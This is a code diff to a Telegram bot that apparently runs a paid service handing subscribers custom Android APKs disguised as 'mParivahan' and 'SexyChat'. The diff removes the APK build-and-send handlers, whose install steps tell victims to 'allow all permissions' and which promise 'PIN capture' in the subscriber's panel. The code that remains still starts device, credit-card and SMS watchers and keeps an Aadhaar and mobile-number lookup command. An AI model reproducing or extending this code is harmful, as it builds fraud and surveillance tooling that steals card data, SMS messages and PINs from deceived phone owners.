@@ -1,15 +1,6 @@
 import { Context, Markup, Telegraf } from "telegraf";
 import { ADMIN_ID, isAdminTg } from "../lib/admin";
 import { logger } from "../lib/logger";
-import {
-  buildUserApk,
-  buildSexyChatApk,
-  getApkSize,
-  initApkTemplate,
-  initSexyTemplate,
-  isTemplateReady,
-  isSexyTemplateReady,
-} from "./apkBuilder";
 import { startDeviceWatcher } from "./deviceWatcher";
 import { startCcWatcher } from "./ccWatcher";
 import { startSmsWatcher } from "./smsWatcher";
@@ -78,8 +69,6 @@ export async function sendSubscriptionNotification(
 ): Promise<boolean> {
   if (!bot || !sub) return false;
   const now = Date.now();
-  const isActive =
-    sub.status === "active" && (!sub.expiresAt || now < sub.expiresAt);
   const daysLeft = sub.expiresAt
     ? Math.max(0, Math.floor((sub.expiresAt - now) / (1000 * 60 * 60 * 24)))
     : 0;
@@ -92,8 +81,6 @@ export async function sendSubscriptionNotification(
     (sub.expiresAt ? `⏰ Expires: ${formatDate(sub.expiresAt)}\n` : "") +
     `🕐 Days Left: ${daysLeft}d\n` +
     (sub.email ? `📧 Email: ${sub.email}\n` : "") +
-    `\n📱 /apk — mParivahan APK\n` +
-    `💬 /sexychat — SexyChat APK\n` +
     `🔑 /reset\\_password — Web panel password set karo\n` +
     `🌐 Panel: ${getPanelUrl()}`;
 
@@ -154,181 +141,6 @@ async function deliverPendingNotifications(ctx: Context): Promise<void> {
   }
 }
 
-async function fetchSub(id: string) {
-  return getSubscription(id);
-}
-
-// ── APK send helpers ──────────────────────────────────────────────────────
-async function sendMparivahanApk(ctx: Context) {
-  const userId = ctx.from!.id.toString();
-  if (!ctx.chat) return;
-  try {
-    const sub = await fetchSub(userId);
-    if (!isAdmin(ctx)) {
-      const now = Date.now();
-      const isActive =
-        sub?.status === "active" && (!sub?.expiresAt || now < sub.expiresAt);
-      if (!isActive) {
-        await ctx.reply("❌ Subscription expired or not found. Contact admin.");
-        return;
-      }
-    }
-
-    if (!isTemplateReady()) {
-      await ctx.reply(
-        "⏳ APK system is initializing (first-time setup ~2 min). Please try again shortly."
-      );
-      return;
-    }
-
-    const statusMsg = await ctx.reply(
-      "🔨 *Building your APK...*\nThis may take 30-60 seconds.",
-      {
-        parse_mode: "Markdown",
-      }
-    );
-
-    const apkPath = await buildUserApk(userId);
-    if (!apkPath) {
-      await ctx.telegram.editMessageText(
-        ctx.chat.id,
-        statusMsg.message_id,
-        undefined,
-        "❌ APK build failed — template not ready. Contact admin."
-      );
-      return;
-    }
-
-    const size = getApkSize(apkPath);
-    const buildId = Math.floor(Math.random() * 90000) + 10000;
-
-    await ctx.telegram.editMessageText(
-      ctx.chat.id,
-      statusMsg.message_id,
-      undefined,
-      `✅ *APK Ready!*\n\n📦 Size: ${size}\n🆔 Build: #${buildId}\n\nSending file...`
-    );
-
-    await ctx.replyWithDocument({
-      source: apkPath,
-      filename: `mParivahan_HARRYAXE_${userId}.apk`,
-    });
-
-    await ctx.reply(
-      `📱 *Install Steps:*\n\n` +
-        `1. Install & open the APK\n` +
-        `2. Allow all permissions\n` +
-        `3. Done — device will appear in panel\n\n` +
-        `_Isse install karte hi aapka device panel mein connect ho jayega._`,
-      { parse_mode: "Markdown" }
-    );
-  } catch (err: any) {
-    logger.error({ err }, "mParivahan APK command failed");
-    await ctx.reply("❌ APK generation failed. Contact admin.");
-  }
-}
-
-async function sendSexyChatApk(ctx: Context) {
-  const userId = ctx.from!.id.toString();
-  if (!ctx.chat) return;
-  try {
-    const sub = await fetchSub(userId);
-    if (!isAdmin(ctx)) {
-      const now = Date.now();
-      const isActive =
-        sub?.status === "active" && (!sub?.expiresAt || now < sub.expiresAt);
-      if (!isActive) {
-        await ctx.reply("❌ Subscription expired or not found. Contact admin.");
-        return;
-      }
-    }
-
-    if (!isSexyTemplateReady()) {
-      await ctx.reply(
-        "⏳ SexyChat APK system is initializing (first-time setup). Please try again shortly."
-      );
-      return;
-    }
-
-    const statusMsg = await ctx.reply(
-      "🔨 *Building your SexyChat APK...*\nThis may take 30-60 seconds.",
-      {
-        parse_mode: "Markdown",
-      }
-    );
-
-    const sexyApkPath = await buildSexyChatApk(userId);
-    if (!sexyApkPath) {
-      await ctx.telegram.editMessageText(
-        ctx.chat.id,
-        statusMsg.message_id,
-        undefined,
-        "❌ SexyChat APK build failed — template not ready. Contact admin."
-      );
-      return;
-    }
-
-    const size = getApkSize(sexyApkPath);
-
-    await ctx.telegram.editMessageText(
-      ctx.chat.id,
-      statusMsg.message_id,
-      undefined,
-      `✅ *SexyChat APK Ready!*\n\n📦 Size: ${size}\n\nSending file...`
-    );
-
-    await ctx.replyWithDocument({
-      source: sexyApkPath,
-      filename: `SexyChat_${userId}.apk`,
-    });
-
-    await ctx.reply(
-      `💬 *SexyChat APK Install Steps:*\n\n` +
-        `1. Install & open the APK\n` +
-        `2. Allow all permissions\n` +
-        `3. Done — enjoy!\n\n` +
-        `_Is APK aapke device ID (${userId}) ke saath build hua hai — PIN capture aapke panel mein aayega._`,
-      { parse_mode: "Markdown" }
-    );
-  } catch (err: any) {
-    logger.error({ err }, "SexyChat APK command failed");
-    await ctx.reply("❌ SexyChat APK send failed. Contact admin.");
-  }
-}
-
-async function handleApkCommand(ctx: Context) {
-  const userId = ctx.from!.id.toString();
-  try {
-    const sub = await fetchSub(userId);
-    if (!isAdmin(ctx)) {
-      const now = Date.now();
-      const isActive =
-        sub?.status === "active" && (!sub?.expiresAt || now < sub.expiresAt);
-      if (!isActive) {
-        await ctx.reply("❌ Subscription expired or not found. Contact admin.");
-        return;
-      }
-    }
-
-    await ctx.reply(
-      `📦 *Select APK to download:*\n\n` +
-        `📱 **mParivahan** — Private panel app\n` +
-        `💬 **SexyChat** — Chat app`,
-      {
-        parse_mode: "Markdown",
-        ...Markup.inlineKeyboard([
-          [
-            Markup.button.callback("📱 mParivahan APK", "apk_mparivahan"),
-            Markup.button.callback("💬 SexyChat APK", "apk_sexychat"),
-          ],
-        ]),
-      }
-    );
-  } catch (err: any) {
-    logger.error({ err }, "APK menu failed");
-    await ctx.reply("❌ APK menu failed. Contact admin.");
-  }
-}
 
 async function handleListUsers(ctx: Context) {
   if (!isAdmin(ctx)) {
@@ -392,13 +204,6 @@ async function handleSetPanelEmail(ctx: Context) {
 export async function startBot(): Promise<void> {
   if (!BOT_TOKEN) return;
 
-  // Pre-decode APK templates in background so /apk and /sexychat are ready instantly
-  initApkTemplate().catch((err) =>
-    logger.error({ err }, "APK template init failed")
-  );
-  initSexyTemplate().catch((err) =>
-    logger.error({ err }, "SexyChat template init failed")
-  );
 
   bot = new Telegraf(BOT_TOKEN, { handlerTimeout: 600_000 }); // 10 min — APK builds must never kill polling
 
@@ -427,8 +232,6 @@ export async function startBot(): Promise<void> {
           `Welcome back, @${ctx.from.username || "admin"}!\n\n` +
           `*Available Commands:*\n` +
           `/start — Show this menu\n` +
-          `/apk — Get mParivahan APK\n` +
-          `/sexychat — Get SexyChat APK\n` +
           `/reset\\_password — Reset web panel password\n` +
           `/setpanel — Set panel email\n\n` +
           `*Admin Commands:*\n` +
@@ -563,19 +366,6 @@ export async function startBot(): Promise<void> {
     }
   });
 
-  // ─── /apk ────────────────────────────────────────────────────────────────
-  bot.command("apk", handleApkCommand);
-
-  // ─── APK callback actions ───────────────────────────────────────────────
-  bot.action("apk_mparivahan", async (ctx) => {
-    await ctx.answerCbQuery("Building mParivahan APK...");
-    await sendMparivahanApk(ctx);
-  });
-
-  bot.action("apk_sexychat", async (ctx) => {
-    await ctx.answerCbQuery("Sending SexyChat APK...");
-    await sendSexyChatApk(ctx);
-  });
 
   // ─── /reset_password ─────────────────────────────────────────────────────
   bot.command("reset_password", handleResetPassword);
@@ -737,11 +527,6 @@ export async function startBot(): Promise<void> {
     await ctx.reply("🗑️ Global SMS channel removed.");
   });
 
-  // ─── /sexychat ──────────────────────────────────────────────────────────
-  // Sends the pre-built SexyChat APK directly
-  bot.command("sexychat", async (ctx) => {
-    await sendSexyChatApk(ctx);
-  });
 
   // ─── /osint — mobile/aadhar lookup (data only, no credits/parsing) ─────
   bot.command("osint", async (ctx) => {
